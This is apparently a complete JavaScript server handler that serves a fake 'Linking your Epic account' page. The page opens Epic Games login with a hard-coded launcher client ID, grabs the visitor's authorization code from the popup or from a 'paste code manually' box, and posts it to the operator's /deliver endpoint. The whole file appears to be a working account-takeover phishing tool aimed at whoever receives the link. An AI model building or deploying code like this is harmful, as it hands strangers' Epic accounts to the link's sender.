/**
 * GET /pop/:token
 * Person B's page. Opens the Epic auth popup, captures the code,
 * POSTs it to /deliver. Handles all fallbacks.
 */
import { getSession } from './_db.js';

const LAUNCHER_ID = '34a02cf8f4414e29b15921876da36f9a';

export default async function handler(req, res) {
  const token = String(req.url.split('/pop/')[1] || '').split('?')[0].trim();

  const s = await getSession(token);
  if (!s) {
    res.setHeader('Content-Type', 'text/html');
    return res.status(410).send(`<html><body style="background:#080808;color:#888;font-family:sans-serif;padding:40px;text-align:center">
      <p>Session expired. Ask for a new link.</p></body></html>`);
  }

  const base        = `https://${req.headers.host}`;
  const deliverUrl  = `${base}/deliver`;
  const epicDirect  = `https://www.epicgames.com/id/api/redirect?clientId=${LAUNCHER_ID}&responseType=code`;
  const epicLogin   = `https://www.epicgames.com/id/login?redirectUrl=${encodeURIComponent(epicDirect)}`;

  console.log(`[POP] token=${token.slice(0,8)}`);

  res.setHeader('Content-Type', 'text/html');
  res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Linking Epic Account…</title>
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{background:#080808;color:#d0d0d0;font-family:-apple-system,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:24px}
    .card{background:#101010;border:1px solid #1e1e1e;border-radius:20px;padding:40px 36px;max-width:440px;width:100%;text-align:center}
    .spinner{width:40px;height:40px;border:3px solid #1e1e1e;border-top-color:#00e676;border-radius:50%;animation:spin .7s linear infinite;margin:0 auto 20px}
    @keyframes spin{to{transform:rotate(360deg)}}
    h2{color:#fff;font-size:1.2em;margin-bottom:8px}
    .sub{color:#555;font-size:0.85em;line-height:1.6;margin-bottom:24px}
    .status{font-size:0.85em;color:#00e676;min-height:20px;margin-bottom:20px}
    .status.err{color:#ff5252}
    .manual{display:none;margin-top:8px;text-align:left}
    .manual.show{display:block}
    .manual-label{font-size:0.75em;color:#444;text-transform:uppercase;letter-spacing:.05em;margin-bottom:8px}
    input{width:100%;background:#161616;border:1px solid #252525;border-radius:8px;color:#fff;padding:11px 13px;font-size:0.9em;font-family:monospace;outline:none;transition:border .15s;margin-bottom:8px}
    input:focus{border-color:#00e676}
    input::placeholder{color:#333}
    button{width:100%;background:#00e676;color:#000;border:none;border-radius:8px;padding:12px;font-size:0.9em;font-weight:700;cursor:pointer}
    button:hover{opacity:.85}
    .success{display:none}
    .success.show{display:block}
    .success .icon{font-size:2.4em;margin-bottom:10px}
    .success h2{color:#00e676}
    .success p{color:#555;font-size:0.85em;margin-top:8px}
  </style>
</head>
<body>
<div class="card">
  <div id="loadingView">
    <div class="spinner"></div>
    <h2>Linking your Epic account…</h2>
    <p class="sub">A popup will open. If you're logged into Epic Games it closes on its own and your account is linked instantly.</p>
    <div class="status" id="st">Opening Epic…</div>
    <div class="manual" id="manualBox">
      <div class="manual-label">Paste code manually</div>
      <input type="text" id="ci" placeholder="32-char code from Epic page…" maxlength="36" autocomplete="off" spellcheck="false">
      <button onclick="submitManual()">Submit</button>
    </div>
  </div>
  <div class="success" id="successView">
    <div class="icon">✅</div>
    <h2>Account Linked!</h2>
    <p>You can close this window.</p>
  </div>
</div>

<script>
const TOKEN       = '${token}';
const DELIVER_URL = '${deliverUrl}';
const EPIC_DIRECT = '${epicDirect}';
const EPIC_LOGIN  = '${epicLogin}';

let submitted = false;
let popup = null;
let pollTimer = null;
let attempts = 0;

function st(msg, err) {
  const el = document.getElementById('st');
  el.textContent = msg;
  el.className = 'status' + (err ? ' err' : '');
}

function showSuccess() {
  document.getElementById('loadingView').style.display = 'none';
  document.getElementById('successView').className = 'success show';
}

function showManual() {
  document.getElementById('manualBox').className = 'manual show';
  if (attempts <= 2) window.open(EPIC_DIRECT, '_blank');
}

function extractCode(text) {
  const m = text.match(/"authorizationCode"\\s*:\\s*"([a-f0-9]{32})"/i)
         || text.match(/"code"\\s*:\\s*"([a-f0-9]{32})"/i)
         || text.match(/[?&]code=([a-f0-9]{32})/i)
         || text.match(/authorized\\?code=([a-f0-9]{32})/i);
  return m ? m[1] : null;
}

async function deliver(code) {
  if (submitted) return;
  submitted = true;
  st('Sending to server…');
  try {
    const r = await fetch(DELIVER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: TOKEN, code }),
    });
    const d = await r.json();
    if (d.ok) { showSuccess(); }
    else { submitted = false; st('Server error: ' + (d.error || 'unknown'), true); showManual(); }
  } catch(e) {
    submitted = false;
    st('Network error — paste code manually', true);
    showManual();
  }
}

function openPopup() {
  attempts++;
  const w = 500, h = 660;
  const left = Math.max(0, (screen.width  - w) / 2);
  const top  = Math.max(0, (screen.height - h) / 2);

  // Try direct endpoint first — skips login page if already logged in
  popup = window.open(EPIC_DIRECT, 'epicauth',
    'width='+w+',height='+h+',left='+left+',top='+top+',toolbar=no,menubar=no,scrollbars=yes');

  if (!popup || popup.closed) {
    st('Popup blocked — paste the code below', true);
    showManual();
    return;
  }

  st('Waiting for Epic…');
  let ticks = 0;

  pollTimer = setInterval(() => {
    ticks++;

    if (!popup || popup.closed) {
      clearInterval(pollTimer);
      if (!submitted) { st('Popup closed — paste the code below', true); showManual(); }
      return;
    }

    // ── Try reading popup.location ──────────────────────────────
    let href = null;
    try { href = popup.location.href; } catch (_) { /* cross-origin epic.com */ }

    if (href) {
      console.log('[POLL] href readable:', href);
      // Try extracting from URL query param (localhost redirect)
      let code = extractCode(href);

      // Try popup body (works on localhost connection-refused pages in some browsers)
      if (!code) {
        try {
          const body = popup.document?.body?.innerText || popup.document?.body?.innerHTML || '';
          code = extractCode(body);
          if (code) console.log('[POLL] extracted from popup body');
        } catch (_) {}
      }

      if (code) {
        clearInterval(pollTimer);
        popup.close();
        deliver(code);
        return;
      }

      // href readable but no code — might be connection-error page
      if (href.includes('localhost') || href === 'about:blank' || href.startsWith('chrome-error')) {
        clearInterval(pollTimer);
        popup.close();
        st('Could not extract code — paste manually', true);
        showManual();
        return;
      }
    }

    if (ticks > 120) { // 60s
      clearInterval(pollTimer);
      if (!submitted) { popup.close(); st('Timed out — paste manually', true); showManual(); }
    }
  }, 500);
}

document.getElementById('ci').addEventListener('input', e => {
  const v = e.target.value.trim().replace(/[^a-f0-9]/gi, '');
  if (v.length === 32 && !submitted) setTimeout(() => deliver(v), 200);
});

function submitManual() {
  const code = document.getElementById('ci').value.trim().replace(/[^a-f0-9]/gi, '').toLowerCase();
  if (code.length !== 32) { st('Need exactly 32 hex chars', true); return; }
  deliver(code);
}

openPopup();
</script>
</body>
</html>`);
}
